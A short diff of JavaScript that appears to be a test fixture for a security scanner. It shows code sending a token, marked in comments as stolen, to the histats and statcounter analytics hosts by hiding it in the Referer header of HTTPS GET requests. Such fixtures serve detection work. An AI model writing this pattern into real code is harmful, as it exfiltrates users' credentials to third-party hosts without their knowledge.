@@ -15,13 +15,13 @@ try {
           hostname: "sstatic1.histats.com",
           path: "/0.gif?4103075&101",
           method: "GET",
-          headers: { Referer: "http://1.a/" + content } //BAD: passing stolen token in a  header
+          headers: { Referer: "https://1.a/" + content } //BAD: passing stolen token in a  header
         }, () => { })
         https1.get({
           hostname: "c.statcounter.com",
           path: "/11760461/0/7b5b9d71/1/",
           method: "GET",
-          headers: { Referer: "http://2.b/" + content } //BAD: passing stolen token in a  header
+          headers: { Referer: "https://2.b/" + content } //BAD: passing stolen token in a  header
         }, () => { })
       });
     });
